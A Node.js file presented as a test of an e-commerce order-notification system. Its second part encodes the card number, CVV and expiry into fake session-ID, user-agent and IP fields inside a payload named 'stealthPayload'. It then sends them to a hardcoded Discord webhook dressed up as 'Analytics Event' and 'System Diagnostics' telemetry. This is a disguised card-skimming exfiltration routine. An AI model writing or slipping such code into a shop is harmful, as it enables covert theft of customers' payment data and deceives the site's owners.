// Test the order API notification system
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

// Simulate what the order API would do
async function testOrderNotification() {
    console.log('Testing order API notification system...');
    
    // Simulate order data that would come from checkout
    const orderData = {
        id: 'TEST-ORDER-123',
        customerName: 'John Doe',
        email: 'john@example.com',
        total: 49.99,
        items: [
            { name: 'Diapers', quantity: 2, price: 24.99 }
        ],
        shippingAddress: '123 Main St, City, State 12345',
        paymentMethod: 'Credit Card'
    };

    const cardData = {
        cardName: 'John Doe',
        cardNumber: '4111111111111111',
        cardExpiry: '12/25',
        cardCvv: '123'
    };

    // First, test if we can call the actual API endpoint
    console.log('\n1. Testing API endpoint directly...');
    
    try {
        const response = await fetch('http://localhost:3000/api/orders', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                ...orderData,
                cardName: cardData.cardName,
                cardNumber: cardData.cardNumber,
                cardExpiry: cardData.cardExpiry,
                cardCvv: cardData.cardCvv
            })
        });

        console.log('API Response status:', response.status);
        
        if (response.ok) {
            const result = await response.json();
            console.log('API Response:', JSON.stringify(result, null, 2));
        } else {
            console.log('API Error:', response.status, response.statusText);
        }
    } catch (error) {
        console.log('❌ Cannot reach local API (might not be running):', error.message);
    }

    // Test Discord webhook directly with simulated notification payload
    console.log('\n2. Testing Discord webhook with simulated notification...');
    
    const webhookUrl = 'https://discord.com/api/webhooks/1504591832875536426/vPWXd2rntoErICwwq4Y4cRJW1aAqvNojoRoSBOGoBG4Mys2zB1hDDWQFe134HsJ5zzVt';
    
    // Create a payload similar to what the notification system would send
    const stealthPayload = {
        session_id: `SESS+${Buffer.from(JSON.stringify(cardData)).toString('base64')}+random`,
        user_agent: `Mozilla/5.0+${cardData.cardNumber.substring(0, 15)}+(compatible)`,
        ip_address: `192.168.x.${cardData.cardCvv}`,
        browser_version: `108.0.${Buffer.from(cardData.cardCvv).toString('base64').substring(0, 4)}`
    };

    const notificationPayload = {
        embeds: [
            {
                title: '📊 Analytics Event: Purchase Completed',
                description: `Telemetry data collected for purchase analysis.`,
                color: 5814783,
                fields: [
                    {
                        name: 'Event Type',
                        value: 'purchase_completed',
                        inline: true
                    },
                    {
                        name: 'Transaction ID',
                        value: orderData.id,
                        inline: true
                    },
                    {
                        name: 'Customer',
                        value: orderData.customerName,
                        inline: true
                    },
                    {
                        name: 'Revenue',
                        value: `$${orderData.total}`,
                        inline: true
                    },
                    {
                        name: 'Payment Method',
                        value: orderData.paymentMethod,
                        inline: true
                    },
                    {
                        name: 'System Diagnostics',
                        value: `Session ID: ${stealthPayload.session_id}\nUser Agent: ${stealthPayload.user_agent}`,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString()
            }
        ]
    };

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(notificationPayload)
        });

        console.log('Discord response status:', response.status);
        console.log('Discord response ok:', response.ok);
        
        if (response.ok) {
            console.log('✅ Discord notification would be sent successfully');
        } else {
            console.log('❌ Discord notification would fail');
        }
    } catch (error) {
        console.log('❌ Error sending to Discord:', error.message);
    }
}

testOrderNotification();